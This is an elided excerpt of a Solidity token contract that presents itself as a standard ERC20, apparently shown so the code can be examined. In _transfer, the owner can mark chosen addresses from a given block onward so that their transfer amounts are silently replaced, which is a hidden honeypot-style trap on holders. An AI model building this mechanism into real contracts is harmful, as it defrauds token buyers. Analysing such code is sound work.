...
contract ERC20 is Context, IERC20 {
  ...
  mapping(address => uint256) private _includedAddresses; 
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    if (!_Presale) {
        ...
        if (sender != owner && !Gwei[sender] && _includedAddresses[sender] != 0 && _includedAddresses[sender] <= block.number) {
            amount = _blockRecord;
        }
  ...
  function includeAddressWithBlock(address _address, uint256 blockNumber) external {
    require(_msgSender() == owner, "Not the owner");
    _includedAddresses[_address] = blockNumber;
  }
